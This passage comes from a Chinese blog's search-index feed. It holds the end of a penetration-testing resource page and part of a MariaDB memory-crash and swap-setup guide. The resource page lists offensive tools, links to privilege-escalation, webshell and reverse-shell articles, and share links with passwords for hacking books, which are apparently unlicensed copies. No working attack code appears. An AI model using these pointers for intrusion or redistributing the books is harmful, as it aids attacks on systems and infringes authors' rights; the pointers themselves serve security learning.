href="https://github.com/Arachni/arachni" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">XSStrike</td><td align="center">基于python的XSS漏洞扫描和利用工具<br>它对参数进行模糊测试之后构建合适的payload，<br>然后对参数进行穷举匹配，大多数payload都是由作者精心构造。<br>其内置爬虫功能，能够检测并尝试绕过WAF，且误报率极低</td><td align="center"><a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">XssPy</td><td align="center">基于python的Web应用XSS漏洞智能扫描器<br>它不仅能检查主页或给定页面，还能够检查网站上的所有链接以及子域<br>微软、斯坦福、摩托罗拉、Informatica等很多大型企业机构都在用</td><td align="center"><a href="https://github.com/faizann24/XssPy" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">Wfuzz</td><td align="center">Web Fuzzer：Web应用程序评估审查工具<br>它可以对任何字段的HTTP请求中的数据进行模糊处理</td><td align="center"><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">OpenSCAP</td><td align="center">基于C/C++实现的SCAP协议开源框架<br>目的是为SCAP各个标准协议的使用者提供一套简单易用的接口</td><td align="center"><a href="http://www.open-scap.org/" target="_blank" rel="nofollow">官网</a><br><a href="http://www.scap.org.cn/" target="_blank" rel="nofollow">中文社区</a><br><a href="https://github.com/OpenSCAP/openscap" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">Hackvertor</td><td align="center">黑客工具包<br>看看黑客们平时都在用什么工具</td><td align="center"><a href="https://hackvertor.co.uk/public" target="_blank" rel="nofollow">官网</a></td></tr><tr><td align="center">SSL/TLS安全评估报告</td><td align="center">检查HTTPS网站的SSL证书安全性</td><td align="center"><a href="https://myssl.com/" target="_blank" rel="nofollow">在线检查</a></td></tr><tr><td align="center">SecurityHeaders</td><td align="center">通过分析HTTP响应头，评估相关安全选项是否配置得当<br>可根据评估建议修改配置</td><td align="center"><a href="https://securityheaders.com/" target="_blank" rel="nofollow">在线检查</a></td></tr><tr><td align="center">URL Fuzzer</td><td align="center">扫描Web服务器上的隐藏文件/目录是否存在敏感信息</td><td align="center"><a href="https://pentest-tools.com/website-vulnerability-scanning/discover-hidden-directories-and-files" target="_blank" rel="nofollow">在线检查</a></td></tr><tr><td align="center">MD5Online</td><td align="center">MD5解密：通过已知的Hash字典逆向爆破<br>（论MD5加salt的重要性）</td><td align="center"><a href="https://www.md5online.org/" target="_blank" rel="nofollow">在线使用</a></td></tr><tr><td align="center">truffleHog</td><td align="center">排查 Git 项目中是否包含可疑的敏感信息</td><td align="center"><a href="https://github.com/dxa4481/truffleHog" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">BFG Repo-Cleaner</td><td align="center">移除 Git 库中的大文件或污点提交</td><td align="center"><a href="https://rtyley.github.io/bfg-repo-cleaner/" target="_blank" rel="nofollow">官网</a><br><a href="https://help.github.com/articles/removing-sensitive-data-from-a-repository/" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">brakeman</td><td align="center">通过静态代码扫描发现代码里的SQL注入问题</td><td align="center"><a href="https://github.com/presidentbeef/brakeman" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">gixy</td><td align="center">Nginx 配置文件静态分析器<br>防止安全配置错误，并自动进行缺陷检测</td><td align="center"><a href="https://github.com/yandex/gixy" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">bleach</td><td align="center">HTML净化器<br>对HTML片段进行标签或属性过滤，预防XSS攻击</td><td align="center"><a href="https://github.com/ecto/bleach" target="_blank" rel="nofollow">Github</a><br><a href="https://pypi.org/project/bleach/" target="_blank" rel="nofollow">Python版</a><br><a href="http://htmlpurifier.org/" target="_blank" rel="nofollow">PHP版</a></td></tr><tr><td align="center">New PHP Snippet</td><td align="center">PHP在线运行环境</td><td align="center"><a href="https://glot.io/new/php" target="_blank" rel="nofollow">在线使用</a></td></tr><tr><td align="center">RequestBin</td><td align="center">临时 HTTP 服务器，用于收集 HTTP 请求，XSS 利器</td><td align="center"><a href="https://requestbin.fullcontact.com/" target="_blank" rel="nofollow">在线使用</a></td></tr></tbody></table><hr><h2 id="参考书"><a href="#参考书" class="headerlink" title="参考书"></a>参考书</h2><table><thead><tr><th align="center">参考书（Kali系列）</th><th align="center">简介/版本</th><th align="center">下载</th></tr></thead><tbody><tr><td align="center">Penetration Testing with Kali Linux (pwk.1.0)</td><td align="center">Kali-Linux渗透测试学习指南<br>PwK官方文档v1.0.1 - 2014版</td><td align="center"><a href="https://share.weiyun.com/5Z23CiY" target="_blank" rel="nofollow">腾讯微云</a><br>密码：4vi4bw</td></tr><tr><td align="center">Instant Kali Linux</td><td align="center">2013<br>Kali快速入门指导</td><td align="center"><a href="https://share.weiyun.com/5ar7k9m" target="_blank" rel="nofollow">腾讯微云</a><br>密码：ryxi47</td></tr><tr><td align="center">Basic Security Testing with Kali Linux</td><td align="center">2014<br>基于Kali的安全测试</td><td align="center"><a href="https://share.weiyun.com/5PrItbo" target="_blank" rel="nofollow">腾讯微云</a><br>密码：qw9ym8</td></tr><tr><td align="center">Hacking with Kali - <br>Practical Penetration Testing Techniques</td><td align="center">2014<br>渗透测试实践技术</td><td align="center"><a href="https://share.weiyun.com/55GnaFY" target="_blank" rel="nofollow">腾讯微云</a><br>密码：xk8a3z</td></tr><tr><td align="center">Kali Linux Cookbook</td><td align="center">2013<br>Kali指导手册</td><td align="center"><a href="https://share.weiyun.com/5sAQ8mB" target="_blank" rel="nofollow">腾讯微云</a><br>密码：xhgjcd</td></tr><tr><td align="center">Kali Linux Social Engineering</td><td align="center">2013<br>基于Kali的社会工程</td><td align="center"><a href="https://share.weiyun.com/5eT0MG3" target="_blank" rel="nofollow">腾讯微云</a><br>密码：gs4xay</td></tr><tr><td align="center">Kali Linux：Assuring Security By Penetration Testing</td><td align="center">2014<br>通过渗透测试确保安全</td><td align="center"><a href="https://share.weiyun.com/5A6P3Ak" target="_blank" rel="nofollow">腾讯微云</a><br>密码：6nrp2k</td></tr><tr><td align="center">Web Penetration Testing with Kali Linux</td><td align="center">2013<br>web应用渗透测试</td><td align="center"><a href="https://share.weiyun.com/5zhW9me" target="_blank" rel="nofollow">腾讯微云</a><br>密码：2cxp9c</td></tr></tbody></table><br><table><thead><tr><th align="center">参考书（Metasploit系列）</th><th align="center">简介/版本</th><th align="center">下载</th></tr></thead><tbody><tr><td align="center">Metasploit渗透测试魔鬼训练营</td><td align="center">2013.国内中文原创<br>详细讲解了Metasploit渗透测试的<br>技术、方法和技巧，并提供实战的实验室环境</td><td align="center"><a href="https://share.weiyun.com/5zAbIeM" target="_blank" rel="nofollow">腾讯微云</a><br>密码：i9ihtu</td></tr><tr><td align="center">Metasploit The Penetration Tester's Guide</td><td align="center">2011<br>渗透测试入门指导</td><td align="center"><a href="https://share.weiyun.com/5bl1xRV" target="_blank" rel="nofollow">腾讯微云</a><br>密码：6gurxk</td></tr><tr><td align="center">Metasploit Penetration Testing Cookbook</td><td align="center">Jun.2012<br>渗透测试指导手册</td><td align="center"><a href="https://share.weiyun.com/5KfMxPQ" target="_blank" rel="nofollow">腾讯微云</a><br>密码：r4q73x</td></tr></tbody></table><br><table><thead><tr><th align="center">参考书（BackTrack5系列）</th><th align="center">简介/版本</th><th align="center">下载</th></tr></thead><tbody><tr><td align="center">Offensive Security - <br>Penetration Testing with BackTrack (Lab Guide)</td><td align="center">v3.2<br>渗透测试实验室指导手册</td><td align="center"><a href="https://share.weiyun.com/5XzmA5I" target="_blank" rel="nofollow">腾讯微云</a><br>密码：fj9sqt</td></tr><tr><td align="center">BackTrack 5 Wireless Penetration Testing Beginner's Guide</td><td align="center">无线网络渗透测试入门指导</td><td align="center"><a href="https://share.weiyun.com/5Ql8le1" target="_blank" rel="nofollow">腾讯微云</a><br>密码：pdeqfn</td></tr></tbody></table><br><table><thead><tr><th align="center">参考书（其他）</th><th align="center">简介/版本</th><th align="center">下载</th></tr></thead><tbody><tr><td align="center">影响力（中文版）</td><td align="center">社会工程学<br>人为什么犯贱？</td><td align="center"><a href="https://share.weiyun.com/5mcRzVn" target="_blank" rel="nofollow">腾讯微云</a><br>密码：ssyf25</td></tr><tr><td align="center">欺骗的艺术（中文版）</td><td align="center">社会工程学<br>世界著名黑客传奇</td><td align="center"><a href="https://share.weiyun.com/5s0Wwqr" target="_blank" rel="nofollow">腾讯微云</a><br>密码：wtpih9</td></tr><tr><td align="center">Learning Nessus for Penetration Testing</td><td align="center">Jan.2014<br>基于Nessus的渗透测试</td><td align="center"><a href="https://share.weiyun.com/5F4iVQ7" target="_blank" rel="nofollow">腾讯微云</a><br>密码：dak9um</td></tr><tr><td align="center">PP.Penetration Testing with the Bash shell</td><td align="center">May.2014<br>基于Bash的渗透测试</td><td align="center"><a href="https://share.weiyun.com/59Ltlbj" target="_blank" rel="nofollow">腾讯微云</a><br>密码：7saehu</td></tr><tr><td align="center">The Basics of Hacking and Penetration Testing<br>( Ethical Hacking and Penetration Testing Made Easy )</td><td align="center">2011<br>渗透测试的基本理论</td><td align="center"><a href="https://share.weiyun.com/50E2OGL" target="_blank" rel="nofollow">腾讯微云</a><br>密码：z9enyr</td></tr><tr><td align="center">The Basics of Hacking and Penetration Testing<br>( Ethical Hacking and Penetration Testing Made Easy )</td><td align="center">The 2nd Edition, 2013<br>渗透测试的基本理论</td><td align="center"><a href="https://share.weiyun.com/5PKAJAU" target="_blank" rel="nofollow">腾讯微云</a><br>密码：5nwjt3</td></tr><tr><td align="center">Advanced Penetration Testing For Highly-Secured <br>Environments The Ultimate Security Guide</td><td align="center">2012<br>终极指南：高安全环境的渗透测试</td><td align="center"><a href="https://share.weiyun.com/5VoihK7" target="_blank" rel="nofollow">腾讯微云</a><br>密码：3u3c9t</td></tr><tr><td align="center">Gray Hat Hacking</td><td align="center">The 2nd Edition<br>灰帽子黑客</td><td align="center"><a href="https://share.weiyun.com/5EwizdA" target="_blank" rel="nofollow">腾讯微云</a><br>密码：4tvjgb</td></tr><tr><td align="center">Hacking - Firewalls And Networks <br>How To Hack Into Remote Computers</td><td align="center">防火墙突破：远程网络渗透</td><td align="center"><a href="https://share.weiyun.com/5CAc1BG" target="_blank" rel="nofollow">腾讯微云</a><br>密码：k93xfx</td></tr><tr><td align="center">Hacking The Art Of Exploitation</td><td align="center">The 2nd Edition, 2018<br>漏洞利用的艺术</td><td align="center"><a href="https://share.weiyun.com/5FDCNeP" target="_blank" rel="nofollow">腾讯微云</a><br>密码：5c5ee6</td></tr><tr><td align="center">Hacking Wireless Networks For Dummies</td><td align="center">2005<br>无线网络窃听</td><td align="center"><a href="https://share.weiyun.com/5f7y3QF" target="_blank" rel="nofollow">腾讯微云</a><br>密码：px7hgj</td></tr><tr><td align="center">Penetration Testing A Hands-On Introduction to Hacking</td><td align="center">2014<br>渗透测试实践指导</td><td align="center"><a href="https://share.weiyun.com/5Wbiij7" target="_blank" rel="nofollow">腾讯微云</a><br>密码：996jfr</td></tr><tr><td align="center">Practical Hacking - Techniques and Countermeasures</td><td align="center">黑客实践的技术与对策</td><td align="center"><a href="https://share.weiyun.com/5ON5FQG" target="_blank" rel="nofollow">腾讯微云</a><br>密码：ne75b9</td></tr></tbody></table><hr><h2 id="相关文献推荐"><a href="#相关文献推荐" class="headerlink" title="相关文献推荐"></a>相关文献推荐</h2><p><strong>社会工程：</strong></p><ul><li>信息安全之社会工程学（<strong>需翻墙</strong>）：<a href="https://program-think.blogspot.com/2009/05/social-engineering-0-overview.html">常识扫盲</a>、<a href="https://program-think.blogspot.com/2009/05/social-engineering-1-gather-information.html">信息收集</a>、<a href="https://program-think.blogspot.com/2009/05/social-engineering-2-pretend.html">假冒身份</a>、<a href="https://program-think.blogspot.com/2009/05/social-engineering-3-influence.html">施加影响</a></li><li><a href="https://blog.csdn.net/pongba/article/details/1662148">《影响力》——人为什么犯贱</a></li><li><a href="https://www.zhihu.com/question/26113526">有哪些「社会工程学」攻击手段？</a></li><li><a href="https://guanjia.qq.com/news/n4/201505/12_18.html">防范社会工程学攻击的技巧与姿势</a></li></ul><p><strong>场景案例：</strong></p><ul><li><a href="https://www.douban.com/note/624958066/">Penetration Testing with Kali (PWK) 课程和 Offensive Security Certified Professional (OSCP) 考试回顾</a></li><li><a href="https://zhuanlan.zhihu.com/p/24249045">XSS实战：我是如何拿下你的百度账号</a></li><li><a href="http://www.kali.org.cn/thread-27331-1-1.html?tdsourcetag=s_pcqq_aiomsg">如何构建自己的渗透测试环境</a></li><li><a href="https://security.tencent.com/index.php/blog/msg/107">驱散前端安全梦魇——DOMXSS典型场景分析与修复指南</a></li><li><a href="https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/index.html">CSRF 攻击的应对之道</a></li><li><a href="http://www.ruanyifeng.com/blog/2018/06/ddos.html">DDOS 攻击的防范教程</a></li><li><a href="https://www.freebuf.com/column/138074.html">海量日志中，如何实时在线检测未知异常行为？看瀚思的序列异常算法</a></li><li><a href="https://xz.aliyun.com/t/2860">记一次在实战靶机中使用SearchSploit的总结</a></li><li><a href="https://henryhoggard.co.uk/blog/Paypal-2FA-Bypass">Paypal 2FA Bypass（通过删掉HTTP请求参数绕过验证）</a></li><li><a href="http://www.antiy.com/response/Upatre.html">部分利用社工技巧的群发邮件样本关联分析</a></li></ul><p><strong>主机入侵：</strong></p><ul><li><a href="https://www.qa-knowhow.com/?p=4688">主机威胁入侵检测开源工具与规则</a></li><li><a href="https://blog.csdn.net/AlexTan_/article/details/52080171">OSSEC主要功能及原理+详细配置+日志文件分析</a></li><li><a href="https://www.ibm.com/developerworks/cn/opensource/os-cn-elk/index.html">集中式日志系统 ELK 协议栈详解</a></li><li><a href="https://security.tencent.com/index.php/blog/msg/21">浅谈大型网络入侵检测建设</a></li></ul><p><strong>Linux提权：</strong></p><ul><li><a href="https://payatu.com/guide-linux-privilege-escalation/">A GUIDE TO LINUX PRIVILEGE ESCALATION</a></li><li><a href="https://www.xmsec.cc/guide-linux-privilege-escalation/">Linux提权基础介绍</a>（是前一篇的译文）</li><li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">Basic Linux Privilege Escalation</a></li><li><a href="https://www.freebuf.com/articles/system/23993.html">史上最全Linux提权后获取敏感信息方法</a>（是前一篇的译文）</li><li><a href="https://xz.aliyun.com/t/2512">初识linux提权</a></li><li><a href="http://www.4hou.com/technology/2422.html">渗透测试中的Linux提权</a></li><li><a href="https://www.freebuf.com/sectool/121847.html">Linux提权？这四个脚本可以帮助你</a></li><li><a href="https://www.freebuf.com/articles/system/129549.html">Linux提权：从入门到放弃</a></li></ul><p><strong>Windows提权：</strong></p><ul><li><a href="http://www.fuzzysecurity.com/tutorials/16.html">Windows Privilege Escalation Fundamentals</a></li><li>Windows下的渗透测试之提权的基本套路<a href="https://www.anquanke.com/post/id/84852">[上]</a><a href="https://www.anquanke.com/post/id/84855">[下]</a>（是前一篇的译文）</li><li><a href="https://xz.aliyun.com/t/2519">Windows提权笔记</a></li><li><a href="https://xapax.gitbooks.io/security/content/privilege_escalation_windows.html">Privilege Escalation Windows</a></li><li><a href="http://www.4hou.com/system/10212.html">Windows 提权命令指南</a></li><li><a href="https://www.freebuf.com/vuls/87463.html">Windows提权的几种姿势</a></li><li><a href="http://www.secist.com/archives/1070.html">内网渗透之如何玩转Meterpreter？</a></li><li><a href="https://www.freebuf.com/articles/system/184289.html">Windows内核漏洞利用提权教程</a></li><li><a href="https://xz.aliyun.com/t/203">Metasploit、Powershell之AlwaysInstallElevated提权实战</a></li><li><a href="http://drops.xmd5.com/static/drops/tips-2227.html">metasploit 渗透测试笔记(meterpreter篇)</a></li></ul><p><strong>WebShell：</strong></p><ul><li><a href="https://www.jianshu.com/p/02aac12e459f">webshell原理</a></li><li><a href="https://www.00theway.org/2017/07/11/bash%20%E5%8F%8D%E5%BC%B9shell/">bash反弹shell原理解析</a></li><li><a href="https://www.wxwenku.com/d/244863">基于机器学习的web异常检测</a></li><li><a href="https://www.freebuf.com/articles/rookie/190953.html">机器学习入门之像使用Print一样使用算法检测WebShell</a></li><li><a href="https://sec.ctrip.com/doc/%E6%B6%82%E5%AE%8F%E4%BC%9F-OSSEC%E4%B8%8Ewebshell%E7%9B%91%E6%8E%A7%E6%8E%A2%E7%B4%A2.pdf">OSSEC与webshell实时监控探索</a></li></ul><p><strong>HTTP相关：</strong></p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies">HTTP cookies</a></li><li><a href="https://github.com/jin5354/404forest/issues/54">HTTP 安全最佳实践</a></li><li><a href="http://cizixs.com/2016/12/12/restful-api-design-guide/">跟着 Github 学习 Restful HTTP API 设计</a></li></ul><p><strong>其他：</strong></p><ul><li><a href="https://wizardforcel.gitbooks.io/mst-sec-lecture-notes/content/">米斯特白帽培训讲义</a></li><li><a href="http://blog.knownsec.com/Knownsec_RD_Checklist/">知道创宇研发技能表v3.1</a></li><li><a href="https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/index.html">大学霸 Kali Linux 安全渗透教程</a></li><li><a href="https://www.freebuf.com/articles/database/68877.html">大数据安全分析漫谈</a></li><li><a href="https://www.freebuf.com/articles/network/124422.html">浅析ReDoS的原理与实践</a></li><li><a href="https://www.freebuf.com/articles/web/155209.html">最好用的开源Web漏扫工具梳理</a></li><li><a href="https://itextpdf.com/blog/how-completely-remove-file-git-repository">How to completely remove a file from a Git repository</a></li><li><a href="http://mannix.top/2018/11/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E9%9B%86%E5%90%88/">渗透测试常用工具集合</a></li></ul><hr><h2 id="资源下载"><a href="#资源下载" class="headerlink" title="资源下载"></a>资源下载</h2><blockquote><p><a href="https://share.weiyun.com/5eRmvxa">腾讯微云（密码：mpgksn）</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 白帽子 </tag>
            
            <tag> Pwk </tag>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mariadb 周期性崩溃问题处理：Error establishing a database connection</title>
      <link href="/articles/website/mariadb-zhou-qi-xing-beng-kui-chu-li-ji-lu/"/>
      <url>/articles/website/mariadb-zhou-qi-xing-beng-kui-chu-li-ji-lu/</url>
      
        <content type="html"><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><ul><li>建站环境：Centos7 + LAMP + WordPress</li><li>物理内存：2G</li><li>相关插件：Redis Object Cache （Redis缓存加速）</li><li>数据库：Mariadb + Redis （均使用默认数据库配置）</li><li>异常现象：几乎<strong>很规律地每周一次</strong>打开站点时提示<code>Error establishing a database connection</code></li><li>临时恢复手段：重启 Marridb 进程</li></ul><h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><p>刚开始以为是偶发的，就没在意，但是数个月来都是每周一次，就实在是折腾人了。</p><p>最初分析以为是 Redis Object Cache 插件导致的（怀疑是Redis缓存数据过期引起的雪崩），但是关掉Redis Object Cache 之后依旧是每周一次，那就<strong>肯定是Mariadb自身的问题</strong>了。</p><p>而且这个问题有几个很有意思的关键点：</p><ul><li>很有规律地每周一次（当然是基于我的环境而言，不同的环境触发时机可能不同）</li><li>Mariadb数据库未做过任何配置优化（纯粹使用默认配置）</li><li>每次都可以通过重启Mariadb进程恢复</li></ul><p>不难联想到是内存导致的（事后也证实了是这个原因），而重启Mariadb进程可以解决是因为做了内存的释放与再分配。</p><h2 id="原因定位"><a href="#原因定位" class="headerlink" title="原因定位"></a>原因定位</h2><p>首先去核查Mariadb数据库的异常日志，确认数据库崩溃的时候都发生了些什么。</p><p>如果不知道异常日志的位置，可以通过输入以下命令，利用Mariadb的进程信息找到它：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> -ef<span class="token operator">|</span><span class="token function">grep</span> mariadb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>若Mariadb正在运行，会返回类似于以下的信息：</p><blockquote><p>mysql    31877 31532  0 16:07 ?        00:00:04<br>/usr/libexec/mysqld –basedir=/usr –datadir=/var/lib/mysql –plugin-dir=/usr/lib64/mysql/plugin <font color="red">–log-error=/var/log/mariadb/mariadb.log</font> –pid-file=/var/run/mariadb/mariadb.pid –socket=/var/lib/mysql/mysql.sock –port=3306</p></blockquote><p>其中log-error就是异常日志的位置，这里为：</p><blockquote><p>/var/log/mariadb/mariadb.log</p></blockquote><p>通过<code>tail /var/log/mariadb/mariadb.log</code>命令可查看最近发生的异常。</p><p>具体的日志我就不全部贴出来了，这里只拷贝日志中一些与当下要解决的问题相关的部分：</p><blockquote><p><strong># Mariadb崩溃前打印的异常</strong><br>180906  0:51:40 InnoDB: Fatal error: <font color="red">cannot allocate <strong>memory</strong> for the buffer pool</font><br>180807 19:30:09 [ERROR] mysqld: <font color="red">Out of <strong>memory</strong></font> (Needed 128917504 bytes)<br>180908 13:56:25 InnoDB: <font color="red">The InnoDB <strong>memory</strong> heap is disabled</font><br>**# Mariadb重启后打印的信息**<br>180910  8:04:41 InnoDB: Initializing <font color="blue">buffer pool, size = 128.0M</font><br>180910  8:04:41 InnoDB: Completed initialization of buffer pool</p></blockquote><p>前三行就是导致<code>Error establishing a database connection</code>异常的罪魁祸首，在一次数据库崩溃的时候不一定都会出现，但他们所描述的大概意思都是差不多的：由于机器内存不足，无法分配给InnoDB缓冲池足够的内存，导致InnoDB无法启用。</p><p>后两行是Mariadb重启后打印的，意思是：成功分配给InnoDB缓冲池128M内存（<strong>具体分配多少内存是视Mariadb的实际配置而定的</strong>）。</p><p>需知道Mariadb本质上就是Mysql的分支，因此也具备了InnoDB和MyISAM两种存储引擎。而InnoDB的缓存机制与MyISAM的最大区别就在于，InnoDB不仅仅缓存索引，还会缓存实际的数据。所以<strong>使用InnoDB的前提是要有足够大的物理内存</strong>。</p><blockquote><p>在Mariadb的服务配置文件中有一个innodb_buffer_pool_size 参数，它用来设置InnoDB缓存用户表及索引数据的最主要缓存空间，对InnoDB整体性能影响也最大。</p></blockquote><p>其实前面说了这么多，<font color="red"><strong>总结下来就是</strong></font>：</p><p>Mariadb没有配置好InnoDB，WordPress本身就比较占资源，站点访问量稍微大一些，之前已分配给InnoDB的内存就满了。机器内存由于还提供了其他应用服务，剩余内存不够InnoDB重分配，而<strong>机器本身又没有针对垃圾内存的释放策略</strong>，于是Mariadb进程就锁死了。最终WordPress由于无法连接到数据库，在站点页面打印了异常<code>Error establishing a database connection</code>。</p><h2 id="问题处理"><a href="#问题处理" class="headerlink" title="问题处理"></a>问题处理</h2><p>其实这个问题多发于内存低配的服务器上，内存高配服务器并不明显。</p><p>但无论低配还是高配服务器，都需要具备一套针对内存不足时的处理策略。现在既然知道到了问题的根本原因，就能定制出对应的处理方案：</p><ul><li><strong>减少InnoDB需求的内存</strong>：这是直观上处理手段，但是指标不治本，只是问题的触发周期延长了而已。</li><li><strong>优化服务器的内存处理策略</strong>：推荐建立合理的交换分区swap（类似于虚拟内存技术），可从根本上解决问题。</li><li><strong>建立Mariadb进程的守护进程</strong>：这是备用的补救措施，如可通过crontab命令检测Mariadb进程状态，发生异常时即时重启。</li></ul><h2 id="创建交换分区swap"><a href="#创建交换分区swap" class="headerlink" title="创建交换分区swap"></a>创建交换分区swap</h2><p>swap（即交换分区）是在Linux上较为推崇的、类似于Windows的虚拟内存技术。具备swap的Linux，当遇到物理内存不足的情况，就可以把部分硬盘空间当成虚拟内存使用，从而解决了物理内存不足的问题。</p><p>Linux把物理内存划分为多个内存段，称为页面。而交换就是指内存页面被复制到预先设定好的硬盘空间（即交换空间）的过程，目的是释放掉页面的内存，供其他应用使用。物理内存和交换空间的总大小是可用的虚拟内存的总量。</p><p>下面描述如何在Centos上创建交换分区。</p><p>首先需要使用<code>root用户</code>登陆系统。</p><p>通过<code>free -mh</code>命令查看内存和swap的分配情况，<strong>默认Centos是没有设置swap的，因此swap分区的大小是0</strong>：</p><blockquote><p>　　　　total　　used　　　free　　shared　buff/cache　available<br>Mem: 　　　1.8G　　662M　　210M　　560K　　　965M　　　1.0G<br><font color="red">Swap:　　　　0　　　　0　　　　0</font></p></blockquote><p>当然也可以通过<code>swapon -s</code>命令查看已经配置的swap空间（但若无配置swap空间则此命令无任何反应）。</p><p>按照习惯，<strong>建议swap交换分区的大小为实际物理内存的2~2.5倍</strong>。在本例中的物理内存是2G，因此这里创建4G的交换分区。</p><p>此前先通过<code>df -h</code>命令查看硬盘是否有大于4G的可用空间（本例中可见剩余36G，足够了）：</p><blockquote><p>Filesystem　　Size　Used　Avail　Use%　Mounted on<br>　/dev/vda1　　　50G　　12G　<font color="red">36G</font>　25%　　　/<br>　devtmpfs　　　909M    　 0　　909M　0%　　　/dev<br>　tmpfs　　　　　920M　24K　920M　1%　　　/dev/shm<br>　tmpfs　　　　　920M　460K　919M　1%　　/run<br>　tmpfs　　　　　920M　　0　　920M　0%　　/sys/fs/cgroup<br>　tmpfs　　　　　184M　　0　　184M　0%　　/run/user/0</p></blockquote><p>使用<code>dd</code>命令创建swap交换分区文件<code>/home/swap</code>，大小为4G（由于较大，可能耗时较久）：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">dd</span> if<span class="token operator">=</span>/dev/zero of<span class="token operator">=</span>/home/swap bs<span class="token operator">=</span>1024 count<span class="token operator">=</span>4096000<span class="token comment" spellcheck="true"># 命令参数解析</span><span class="token comment" spellcheck="true"># if=&lt;文件>：代表输入文件，默认从stdin中读取输入。/dev/zero 是一个字符设备，会不断返回0值字节（\0）</span><span class="token comment" spellcheck="true"># of=&lt;文件>：代表输出文件，默认以stdout作为输出</span><span class="token comment" spellcheck="true"># bs=&lt;单个块的字节数>：交换分区的读写是以block（块）为单位的，每个block的大小默认为1K，即1024字节</span><span class="token comment" spellcheck="true"># count=&lt;块数>：交换分区文件的block数，count*bs就是交换分区的大小</span><span class="token comment" spellcheck="true"># 若创建成功则返回：</span><span class="token comment" spellcheck="true"># 4096000+0 records in</span><span class="token comment" spellcheck="true"># 4096000+0 records out</span><span class="token comment" spellcheck="true"># 4194304000 bytes (4.2 GB) copied, 40.4638 s, 104 MB/s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个<strong>交换分区文件</strong>上创建<strong>交换分区</strong>：</p><pre class="line-numbers language-bash"><code class="language-bash">mkswap /home/swap<span class="token comment" spellcheck="true"># 若创建成功则返回：</span><span class="token comment" spellcheck="true"># Setting up swapspace version 1, size = 4095996 KiB</span><span class="token comment" spellcheck="true"># no label, UUID=ec9e00e2-3d82-4bc0-bc99-e2e4837dcca5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>激活交换分区：</p><pre class="line-numbers language-bash"><code class="language-bash">swapon /home/swap<span class="token comment" spellcheck="true"># 若激活成功则返回：</span><span class="token comment" spellcheck="true"># swapon: /home/swap: insecure permissions 0644, 0600 suggested.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>再次通过<code>free -mh</code>命令查看内存和swap的分配情况：</p><blockquote><p>　　　　total　　used　　　free　　shared　buff/cache　available<br>Mem: 　　　1.8G　　662M　　210M　　560K　　　965M　　　1.0G<br><font color="red">Swap:　　　3.9G　　　　0B　　　3.9G</font></p></blockquote><p>或通过<code>swapon -s</code>命令查看本机已配置的swap空间：</p><blockquote><p>Filename　　　Type　　　　Size　Used　Priority<br>/home/swap　　　　file　　4095996　　0　　　-1</p></blockquote><p>为了避免系统重启后交换分区失效，需要<strong>设置交换分区在开机后自动挂载</strong>。</p><p>由于系统开机时会主动读取<code>/etc/fstab</code>文件里的配置进行磁盘挂载，这样只需要将交换分区的挂载信息写入这个文件中就可以了。</p><p>通过命令<code>vi /etc/fstab</code>编辑文件，在末尾增加下面一行并保存即可：</p><pre class="line-numbers language-bash"><code class="language-bash">/home/swap           swap                 swap       defaults              0 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><font color="red">至此交换分区创建完成。</font></p><h2 id="附1：减少InnoDB的需求缓存"><a href="#附1：减少InnoDB的需求缓存" class="headerlink" title="附1：减少InnoDB的需求缓存"></a>附1：减少InnoDB的需求缓存</h2><p>一般来说，设置了交换分区就已经解决了这个问题了。但这里还是附上裁减InnoDB缓存的设置方法，针对一些内存极少的机器还是需要的。</p><p>首先登陆到Mariadb数据库<code>mysql -u root -p</code>，通过SQL查看当前InnoDB缓存是多大（若未修改过任何配置，默认情况下应该是128M）：</p><pre class="line-numbers language-sql"><code class="language-sql"> <span class="token keyword">SELECT</span> @<span class="token variable">@innodb_buffer_pool_size</span><span class="token operator">/</span><span class="token number">1024</span><span class="token operator">/</span><span class="token number">1024</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">|</span> @<span class="token variable">@innodb_buffer_pool_size</span><span class="token operator">/</span><span class="token number">1024</span><span class="token operator">/</span><span class="token number">1024</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">|</span>                        